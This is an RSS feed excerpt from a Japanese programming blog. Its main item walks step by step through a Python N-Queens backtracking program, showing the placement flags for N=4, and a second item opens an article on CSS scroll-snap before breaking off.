<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NLP</title><link>https://suzukiiichiro.github.io/</link><description>Recent content on NLP</description><generator>Hugo -- gohugo.io</generator><language>ja-jp</language><lastBuildDate>Mon, 14 Feb 2022 17:55:55 +0900</lastBuildDate><atom:link href="https://suzukiiichiro.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>第7回 pythonでNQueen（エイトクイーン）バックトラック（3）</title><link>https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/</link><pubDate>Mon, 14 Feb 2022 17:55:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/chess.jpg" alt="Featured image of post 第7回 pythonでNQueen（エイトクイーン）バックトラック（3）" />&lt;h2 id="バックトラック">バックトラック&lt;/h2>
&lt;p>今回も引き続きバックトラックを説明していきたいと思います。 &lt;br>
前回はプログラムの概要を説明しましたが、今回はnqueenメソッドの再帰とバックトラックの動きについて図で示しながら説明していきたいとおもいます。&lt;/p>
&lt;p>プログラムソースは以下のURLにあります。&lt;br>
&lt;a class="link" href="https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py" target="_blank" rel="noopener"
>https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py&lt;/a>&lt;/p>
&lt;h2 id="おさらい">おさらい&lt;/h2>
&lt;p>ブルートフォース、配置フラグからのおさらいとして次の点を押さえておきましょう。 &lt;br>
・448行目のABOARD[row]=i はクイーンを配置する動きです。 &lt;br>
・452行目のnqueen(row+1)は再帰でnqueenメソッドを動かしていますがこれは次の行に進む動きです。 &lt;br>
・444,445は最終行(4行目)までクイーンを置ききった後にTOTALに1加算しています。フラグチェックを通過して最終行まで到達すれば正解と判断して良いからです。&lt;/p>
&lt;p>再帰でnqueenメソッドを呼び出したときは、当然のことなのですがメソッドの先頭439行目に移動します。&lt;br>
引数で渡されたrow、size以外のローカル変数はすべて初期化された状態になります。&lt;/p>
&lt;p>・再帰から抜ける部分は2箇所あります。&lt;br>
一つ目は、444,445行目で最終行(4行目)までクイーンを置ききった後にTOTALを加算する時&lt;/p>
&lt;p>二つ目は、447行目のfor文がSIZE数の数(N=4だと3)だけ回りきったあとです。&lt;/p>
&lt;p>再帰から抜けたときは再帰を呼び出した452行目のすぐ後ろからスタートします。&lt;br>
ローカル変数の状態は再帰を呼び出す直前の状態になります。&lt;br>
1行前に戻るような動きとなります。&lt;/p>
&lt;p>ちなみに447行目のfor i in range(SIZE)は右端から左端に1個ずつクイーンを置こうとする動きです。&lt;br>
左端までクイーンを置ききったらfor文を抜けるイメージです。&lt;/p>
&lt;p>450行目のif FA[i] == 0 and FB[row-i+(size-1)] == 0 and FC[row+i] == 0:でFA,FB,FCの配置フラグで利き筋をチェックしています。&lt;br>
FAが上下の利き筋&lt;br>
FBが左対角線上の利き筋&lt;br>
FCが右対角線上の利き筋&lt;br>
をチェックしています&lt;/p>
&lt;h2 id="nqueen-メソッドの動き">nqueen メソッドの動き&lt;/h2>
&lt;p>467行目のnqueen(0,i)からスタートします。&lt;br>
メソッドの先頭439行目に移動します。&lt;br>
row=0なので446行目の else: に移動します。&lt;br>
447行目のfor文に入りi=0からスタートします。&lt;br>
448行目のABOARD[0]=0で1行目の右端にクイーンを設置します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 98;
flex-basis: 237px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q1.jpg" data-size="324x328">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q1.jpg"
width="324"
height="328"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
1個目のクイーンなので当然配置フラグはどれもOの状態ですから450行目のif FA[0] == 0 FB[row-i+(size-1)] == 0 FC[row+i] == 0の条件を満たしてif文の中に入ります。&lt;/p>
&lt;p>451行目でフラグを立てますが以下のようになります。&lt;br>
配列の個数は2&lt;em>MAX-1 MAX=16なので31個ですが31個必要なのはN=16の時です。&lt;br>
N=4のときは2&lt;/em>4-1で7個あれば足ります。&lt;/p>
&lt;p>row=0,i=0なので&lt;br>
FA&lt;br>
FA[0]=1で&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]=1
FA[1]=0
FA[2]=0
FA[3]=0
FA[4]=0
FA[5]=0
FA[6]=0
&lt;/code>&lt;/pre>&lt;p>FB&lt;br>
row-i+(size-1)&lt;br>
0-0+(4-1)=3&lt;br>
FB[3]=1&lt;/p>
&lt;pre tabindex="0">&lt;code>FB[0]=0
FB[1]=0
FB[2]=0
FB[3]=1
FB[4]=0
FB[5]=0
FB[6]=0
&lt;/code>&lt;/pre>&lt;p>FC&lt;br>
row+i&lt;br>
0+0=0&lt;br>
FC[0]=1&lt;/p>
&lt;pre tabindex="0">&lt;code>FC[0]=1
FC[1]=0
FC[2]=0
FC[3]=0
FC[4]=0
FC[5]=0
FC[6]=0
&lt;/code>&lt;/pre>&lt;p>利き筋をビジュアルで表示すると以下の通りです。黒いクイーンの部分は置けません。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 244px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q2.jpg" data-size="326x320">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q2.jpg"
width="326"
height="320"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>452行目でnqueenを引数1を渡して呼び出して2行目に進みます。&lt;/p>
&lt;p>図だと2行目でクイーンを置けるのは3,4列目ですがプログラムの動きではどうなるのか見てみましょう。&lt;/p>
&lt;p>再帰呼び出しなのでrow=1の状態でメソッドの先頭439行目に移動します。&lt;br>
row=1なので446行目の else: に移動します。&lt;br>
447行目のfor文に入りi=0からスタートします。&lt;br>
448行目のABOARD[1]=0で2行目の右端にクイーンを設置します。&lt;br>
1行目で既に右端にクイーンを設置していますのでFA[0]は1になりますので450行目のif FA[i]==0の条件を満たしません。&lt;/p>
&lt;p>if文に入らずに次のfor文に進みます。&lt;br>
この部分が配置フラグの制御になります。&lt;br>
この処理のおかげで上下、左右対角線上の利き筋に引っかかる場合は次の行に移動するのをやめ探索を効率化することができます。&lt;/p>
&lt;p>447行目で次のfor文に進みi=1となります。&lt;/p>
&lt;p>448行目のABOARD[1]=1で2行目の右から2列目にクイーンを設置します。&lt;/p>
&lt;p>450行目でフラグをチェックします&lt;/p>
&lt;p>FAのフラグの状態は以下の通りです&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]=1
FA[1]=0
FA[2]=0
FA[3]=0
FA[4]=0
FA[5]=0
FA[6]=0
&lt;/code>&lt;/pre>&lt;p>i=1&lt;br>
FA[1]==0ですのでFAフラグは通過します。&lt;/p>
&lt;p>FBのフラグの状態は以下の通りです&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]=0
FB[1]=0
FB[2]=0
FB[3]=1
FB[4]=0
FB[5]=0
FB[6]=0
&lt;/code>&lt;/pre>&lt;p>row=1,i=1&lt;br>
row-i+(size-1)&lt;br>
1-1+(4-1)=3&lt;br>
FB[3]==1ですのでFBフラグは通過しません&lt;br>
左対角線上の利き筋に引っかかることになります。&lt;/p>
&lt;p>447行目で次のfor文に進みi=2となります。&lt;/p>
&lt;p>448行目のABOARD[1]=2で2行目の右から3列目にクイーンを設置します。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 98;
flex-basis: 237px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q3.jpg" data-size="322x326">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q3.jpg"
width="322"
height="326"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>450行目でフラグをチェックします&lt;br>
row=1,i=2&lt;br>
FA[2]==0なのでFAのフラグは通過しますFB[row-i+(size-1)-&amp;gt;FB[1-2+(4-1)]-&amp;gt;FB[2]==0なのでFBフラグは通過します&lt;br>
FC[row+i]-&amp;gt;FC[1+2]-&amp;gt;FC[3]==0なのでFCフラグも通過します&lt;/p>
&lt;p>if 文の中に入って451行目でフラグをたてます&lt;/p>
&lt;p>FA&lt;br>
FA[2]=1で&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]=1
FA[1]=0
FA[2]=1
FA[3]=0
FA[4]=0
FA[5]=0
FA[6]=0
&lt;/code>&lt;/pre>&lt;p>FB&lt;br>
FB[2]=1&lt;/p>
&lt;pre tabindex="0">&lt;code>FB[0]=0
FB[1]=0
FB[2]=1
FB[3]=1
FB[4]=0
FB[5]=0
FB[6]=0
&lt;/code>&lt;/pre>&lt;p>FC&lt;br>
FC[3]=1&lt;/p>
&lt;pre tabindex="0">&lt;code>FC[0]=1
FC[1]=0
FC[2]=0
FC[3]=1
FC[4]=0
FC[5]=0
FC[6]=0
&lt;/code>&lt;/pre>&lt;p>ビジュアルで利き筋をみてみると以下の通りです。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 241px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q4.jpg" data-size="328x326">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q4.jpg"
width="328"
height="326"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
3行目にクイーンを置ける場所はなさそうです。&lt;/p>
&lt;p>452行目でnqueenを引数2を渡して呼び出して3行目に進みます。&lt;/p>
&lt;p>row=2,for=0,1,2,3 で450行目のフラグを見てみましょう&lt;/p>
&lt;p>row=2,i=0&lt;br>
FA[i]-&amp;gt;FA[0]==1&lt;br>
FAフラグに引っかかります&lt;/p>
&lt;p>row=2,i=1&lt;br>
FA[i]-&amp;gt;FA[1]==0&lt;br>
FB[row-i+(size-1)]-&amp;gt;FB[2-1+(4-1)]-&amp;gt;FB[4]==0&lt;br>
FC[row+i]-&amp;gt;FC[2+1]-&amp;gt;FC[3]==1&lt;br>
FCフラグに引っかかります&lt;/p>
&lt;p>row=2,i=2&lt;br>
FA[i]-&amp;gt;FA[2]==1&lt;br>
FAフラグに引っかかります&lt;/p>
&lt;p>row=2,i=3&lt;br>
FA[i]-&amp;gt;FA[3]==0&lt;br>
FB[row-i+(size-1)]-&amp;gt;FB[2-3+(4-1)]-&amp;gt;FB[2]==0&lt;br>
FBフラグに引っかかります&lt;/p>
&lt;p>i=3までだめなのでfor文を抜けます。&lt;br>
for文を抜けると再帰を抜け2行目の処理(row=1)に戻ります。&lt;br>
row=1,i=2&lt;/p>
&lt;p>453行目でフラグを落とします&lt;br>
今の状態のフラグが以下の通りです。&lt;/p>
&lt;p>FA&lt;br>
FA[2]=1 のフラグを0にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]=1
FA[1]=0
FA[2]=1--&amp;gt;FA[2]=0
FA[3]=0
FA[4]=0
FA[5]=0
FA[6]=0
&lt;/code>&lt;/pre>&lt;p>FB&lt;br>
FB[2]=1 のフラグを0にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FB[0]=0
FB[1]=0
FB[2]=1--&amp;gt;FB[2]=0
FB[3]=1
FB[4]=0
FB[5]=0
FB[6]=0
&lt;/code>&lt;/pre>&lt;p>FC&lt;br>
FC[3]=1 のフラグを0にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FC[0]=1
FC[1]=0
FC[2]=0
FC[3]=1--&amp;gt;FC[3]=0
FC[4]=0
FC[5]=0
FC[6]=0
&lt;/code>&lt;/pre>&lt;p>447行目で次のfor文に進みi=3となります。&lt;/p>
&lt;p>448行目のABOARD[1]=3で2行目の右から4列目にクイーンを設置します。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 99;
flex-basis: 238px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q5.jpg" data-size="328x330">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q5.jpg"
width="328"
height="330"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>450行目でフラグをチェックします&lt;br>
row=1,i=3&lt;br>
フラグをチェックしてみましょう。&lt;br>
FA[i]-&amp;gt;FA[3]==0&lt;br>
FB[row-i+(size-1)]-&amp;gt;FB[1-3+(4-1)]-&amp;gt;FB[1]==0&lt;br>
FC[row+i]-&amp;gt;FC[1+3]-&amp;gt;FC[4]==0&lt;br>
FA,FB,FCいずれのフラグチェックもクリアしますので451行目のif文に入ります。&lt;/p>
&lt;p>451行目でフラグをたてると以下のようになります。&lt;/p>
&lt;p>FA&lt;br>
FA[3]=1 のフラグを1にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]=1
FA[1]=0
FA[2]=0
FA[3]=1
FA[4]=0
FA[5]=0
FA[6]=0
&lt;/code>&lt;/pre>&lt;p>FB&lt;br>
FB[1]=1 のフラグを1にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FB[0]=0
FB[1]=1
FB[2]=0
FB[3]=1
FB[4]=0
FB[5]=0
FB[6]=0
&lt;/code>&lt;/pre>&lt;p>FC&lt;br>
FC[4]=1 のフラグを1にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FC[0]=1
FC[1]=0
FC[2]=0
FC[3]=0
FC[4]=1
FC[5]=0
FC[6]=0
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 98;
flex-basis: 235px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q6.jpg" data-size="326x332">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q6.jpg"
width="326"
height="332"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>452行目でnqueenを引数2を渡して呼び出して3行目に進みます。 &lt;br>
再帰呼び出しなのでrow=2の状態でメソッドの先頭439行目に移動します。 &lt;br>
row=2なので446行目の else: に移動します。 &lt;br>
447行目のfor文に入りi=0からスタートします。 &lt;br>
448行目のABOARD[2]=0で3行目の右端にクイーンを設置します。&lt;/p>
&lt;p>450行目でフラグをチェックします&lt;br>
row=2,i=0&lt;br>
FA[i]-&amp;gt;FA[0]==1&lt;br>
FAフラグに引っかかります&lt;/p>
&lt;p>447行目で次のfor文に進みi=1となります。&lt;/p>
&lt;p>448行目のABOARD[2]=1で3行目の右から2列目にクイーンを設置します。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 98;
flex-basis: 235px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q7.jpg" data-size="322x328">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q7.jpg"
width="322"
height="328"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>450行目でフラグをチェックします&lt;br>
row=2,i=1&lt;br>
フラグをチェックしてみましょう。&lt;br>
FA[i]-&amp;gt;FA[1]==0&lt;br>
FB[row-i+(size-1)]-&amp;gt;FB[2-1+(4-1)]-&amp;gt;FB[4]==0&lt;br>
FC[row+i]-&amp;gt;FC[2+1]-&amp;gt;FC[3]==0&lt;/p>
&lt;p>FA,FB,FCいずれのフラグチェックもクリアしますので451行目のif文に入ります。&lt;/p>
&lt;p>451行目でフラグをたてると以下のようになります。&lt;/p>
&lt;p>FA&lt;br>
FA[1]=1 のフラグを1にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]=1
FA[1]=1
FA[2]=0
FA[3]=1
FA[4]=0
FA[5]=0
FA[6]=0
&lt;/code>&lt;/pre>&lt;p>FB&lt;br>
FB[4]=1 のフラグを1にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FB[0]=0
FB[1]=1
FB[2]=0
FB[3]=1
FB[4]=1
FB[5]=0
FB[6]=0
&lt;/code>&lt;/pre>&lt;p>FC&lt;br>
FC[3]=1 のフラグを1にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FC[0]=1
FC[1]=0
FC[2]=0
FC[3]=1
FC[4]=1
FC[5]=0
FC[6]=0
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 244px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q8.jpg" data-size="332x326">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q8.jpg"
width="332"
height="326"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
ビジュアル的にみると4行目にクイーンを置ける場所はなさそうですね。&lt;br>
プログラムでの動きを見てみましょう&lt;/p>
&lt;p>452行目でnqueenを引数3を渡して呼び出して3行目に進みます。&lt;/p>
&lt;p>再帰呼び出しなのでrow=3の状態でメソッドの先頭439行目に移動します。 &lt;br>
row=2なので446行目の else: に移動します。&lt;br>
447行目のfor文に入りi=0からスタートします。&lt;br>
i=0,1,2,3での450行目のフラグ判定を見てみましょう&lt;/p>
&lt;p>row=3,i=0&lt;br>
FA[i]-&amp;gt;FA[0]==1&lt;br>
FAフラグに引っかかります&lt;/p>
&lt;p>row=3,i=1&lt;br>
FA[i]-&amp;gt;FA[1]==1&lt;br>
FAフラグに引っかかります&lt;/p>
&lt;p>row=3,i=2&lt;br>
FA[i]-&amp;gt;FA[2]==0&lt;br>
FB[row-i+(size-1)]-&amp;gt;FB[3-2+(4-1)]-&amp;gt;FB[4]==1&lt;br>
FBフラグに引っかかります&lt;/p>
&lt;p>row=2,i=3&lt;br>
FA[i]-&amp;gt;FA[3]==0&lt;br>
FAフラグに引っかかります&lt;/p>
&lt;p>i=3までだめなのでfor文を抜けます。&lt;br>
for文を抜けると再帰を抜け3行目の処理(row=2)に戻ります。&lt;br>
row=2,i=1の状態で452行目の直後に移動します。&lt;br>
453行目でフラグを落とします&lt;br>
今の状態のフラグが以下の通りです。&lt;/p>
&lt;p>FA&lt;br>
FA[1]=1 のフラグを0にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]=1
FA[1]=0
FA[2]=0
FA[3]=1
FA[4]=0
FA[5]=0
FA[6]=0
&lt;/code>&lt;/pre>&lt;p>FB&lt;br>
FB[4]=1 のフラグを1にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FB[0]=0
FB[1]=1
FB[2]=0
FB[3]=1
FB[4]=0
FB[5]=0
FB[6]=0
&lt;/code>&lt;/pre>&lt;p>FC&lt;br>
FC[3]=1 のフラグを1にします。&lt;/p>
&lt;pre tabindex="0">&lt;code>FC[0]=1
FC[1]=0
FC[2]=0
FC[3]=0
FC[4]=1
FC[5]=0
FC[6]=0
&lt;/code>&lt;/pre>&lt;p>フラグを落としたら447行目次のfor文にいきます。&lt;br>
row=2,i=2&lt;br>
row=2,i=3&lt;br>
いずれも450行目のフラグに引っかかります。&lt;br>
i=3までだめなのでfor文を抜けます。&lt;br>
for文を抜けると再帰を抜け2行目の処理(row=1)に戻ります。&lt;br>
row=1,i=3の状態で452行目の直後に移動します。&lt;br>
すでにi=3の状態ですからそのままfor文をぬけ再帰を抜けて1行目の処理(row=0)に戻ります。&lt;br>
row=0,i=0&lt;br>
453行目でフラグを落としますが1行目ですのでまっさらな状態になります。&lt;/p>
&lt;p>447行目で次のfor文に移動します。&lt;br>
row=0,i=1ですので448行目のABOARD[0]=1 で1行目の右から2列目にクイーンをおきます。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 98;
flex-basis: 235px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q9.jpg" data-size="324x330">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q9.jpg"
width="324"
height="330"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
1個目のクイーンなので当然配置フラグはどれもOの状態ですから450行目のif FA[0] == 0 FB[row-i+(size-1)] == 0 FC[row+i] == 0の条件を満たしてif文の中に入ります。&lt;br>
451行目でフラグを立てます&lt;br>
row=0,i=1なので&lt;br>
FA&lt;br>
FA[1]=1で&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]=0
FA[1]=1
FA[2]=0
FA[3]=0
FA[4]=0
FA[5]=0
FA[6]=0
&lt;/code>&lt;/pre>&lt;p>FB&lt;br>
row-i+(size-1)&lt;br>
0-1+(4-1)=2&lt;br>
FB[2]=1&lt;/p>
&lt;pre tabindex="0">&lt;code>FB[0]=0
FB[1]=0
FB[2]=1
FB[3]=0
FB[4]=0
FB[5]=0
FB[6]=0
&lt;/code>&lt;/pre>&lt;p>FC&lt;br>
row+i&lt;br>
0+1=0&lt;br>
FC[1]=1&lt;/p>
&lt;pre tabindex="0">&lt;code>FC[0]=0
FC[1]=1
FC[2]=0
FC[3]=0
FC[4]=0
FC[5]=0
FC[6]=0
&lt;/code>&lt;/pre>&lt;p>利き筋をビジュアルで表示すると以下の通りです。黒いクイーンの部分は置けません。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q10.jpg" data-size="328x328">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q10.jpg"
width="328"
height="328"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>452行目でnqueenを引数1を渡して呼び出して2行目に進みます。&lt;/p>
&lt;p>図だと2行目でクイーンを置けるのは4列目だけです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 244px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q11.jpg" data-size="328x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q11.jpg"
width="328"
height="322"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>447行目のfor文の中でrow=1 i=0,1,2の時にいずれも450行目の配置フラグの制御に引っかかって次のfor文に進みます。&lt;/p>
&lt;p>row=1,i=3の時に450行目の配置フラグを通り抜けられます。&lt;/p>
&lt;p>FA[i]-&amp;gt;FA[3]==0&lt;br>
FB[row-i+(size-1)]-&amp;gt;FB[1-3+(4-1)]-&amp;gt;FB[1]==0&lt;br>
FC[row+i]-&amp;gt;FC[1+3]-&amp;gt;FC[4]==0&lt;/p>
&lt;p>451行目でフラグを立てると以下の図になります。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 242px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q12.jpg" data-size="326x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q12.jpg"
width="326"
height="322"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>row=1,i=3なので&lt;br>
FA&lt;br>
FA[3]=1で&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]=0
FA[1]=1
FA[2]=0
FA[3]=1
FA[4]=0
FA[5]=0
FA[6]=0
&lt;/code>&lt;/pre>&lt;p>FB&lt;br>
row-i+(size-1)&lt;br>
1-3+(4-1)=1&lt;br>
FB[1]=1&lt;/p>
&lt;pre tabindex="0">&lt;code>FB[0]=0
FB[1]=1
FB[2]=1
FB[3]=0
FB[4]=0
FB[5]=0
FB[6]=0
&lt;/code>&lt;/pre>&lt;p>FC&lt;br>
row+i&lt;br>
1+3=0&lt;br>
FC[4]=1&lt;/p>
&lt;pre tabindex="0">&lt;code>FC[0]=0
FC[1]=1
FC[2]=0
FC[3]=0
FC[4]=1
FC[5]=0
FC[6]=0
&lt;/code>&lt;/pre>&lt;p>452行目でrow=2でnqueenを再帰で呼び出します。&lt;br>
row=2の時はi=0の時にクイーンを置くことができます。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 98;
flex-basis: 237px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q13.jpg" data-size="326x330">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q13.jpg"
width="326"
height="330"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
451行目でフラグを立てると以下の図になります。&lt;br>
row=2,i=0なので&lt;br>
FA&lt;br>
FA[0]=1で&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]=1
FA[1]=1
FA[2]=0
FA[3]=1
FA[4]=0
FA[5]=0
FA[6]=0
&lt;/code>&lt;/pre>&lt;p>FB&lt;br>
row-i+(size-1)&lt;br>
2-0+(4-1)=5&lt;br>
FB[5]=1&lt;/p>
&lt;pre tabindex="0">&lt;code>FB[0]=0
FB[1]=1
FB[2]=1
FB[3]=0
FB[4]=0
FB[5]=1
FB[6]=0
&lt;/code>&lt;/pre>&lt;p>FC&lt;br>
row+i&lt;br>
2+0=2&lt;br>
FC[2]=1&lt;/p>
&lt;pre tabindex="0">&lt;code>FC[0]=0
FC[1]=1
FC[2]=1
FC[3]=0
FC[4]=1
FC[5]=0
FC[6]=0
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q14.jpg" data-size="324x324">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q14.jpg"
width="324"
height="324"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
図で見ると最終行で右から3番目にクイーンが置けそうです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 244px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q15.jpg" data-size="326x320">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q15.jpg"
width="326"
height="320"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
452行目でrow=3でnqueenを再帰で呼び出します。&lt;br>
row=3,i=2でフラグをチェックしてみましょう。&lt;/p>
&lt;p>FA[i]-&amp;gt;FA[2]==0&lt;br>
FB[row-i+(size-1)]-&amp;gt;FB[3-2+(4-1)]-&amp;gt;FB[4]==0&lt;br>
FC[row+i]-&amp;gt;FC[3+2]-&amp;gt;FC[5]==0&lt;/p>
&lt;p>450行目のフラグチェックと通過するので&lt;br>
452行目でrow=4でnqueenを再帰で呼び出すことができます。&lt;br>
row=4で再帰を呼び出すと&lt;br>
if row== size : のif文に入り&lt;br>
TOTAL +=1 で総数がカウントされます。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 95;
flex-basis: 229px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q16.jpg" data-size="316x330">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/q16.jpg"
width="316"
height="330"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
445行目の処理が終わると再帰を抜けて上の行に戻ります。&lt;/p>
&lt;p>そんな感じで再帰呼び出し、再帰を抜けるを繰り返して総数を出します。&lt;/p></description></item><item><title>CSSでアプリのようにピタッとスナップするスクロールを作成</title><link>https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/</link><pubDate>Mon, 14 Feb 2022 12:33:28 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/intro.png" alt="Featured image of post CSSでアプリのようにピタッとスナップするスクロールを作成" />&lt;p>&lt;strong>出典元&lt;/strong>：&lt;a class="link" href="https://ishadeed.com/article/css-scroll-snap/" target="_blank" rel="noopener"
> CSS Scroll Snap - Ahmad Shadeed &lt;/a>&lt;/p>
&lt;p>アプリなどで横スクロールしてコンテンツにスナップするといった動作をよく見かけると思いますが、CSSで横スクロールのUIを作成しようとすると、専用のjavascriptやライブラリを使用する必要があったりと実装が大変です。&lt;br>
しかし、CSSスクロールスナップは横スクロールしてスナップするといった動作を行うことができます。&lt;/p>
&lt;p>この記事では、CSSスクロールスナップ（scroll-snap）の基本について説明します。&lt;/p>
&lt;h2 id="scroll-snapを使用する理由">scroll-snapを使用する理由&lt;/h2>
&lt;p>スマホやタブレットの普及で、タッチでスワイプできる画面を設計、構築する必要があるかと思います。&lt;br>
たとえば、ギャラリー風のデザインを考えてみましょう。ユーザーは、階層構造ではなく、左または右に簡単にスワイプして、より多くの画像を表示できます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 197;
flex-basis: 473px"
>
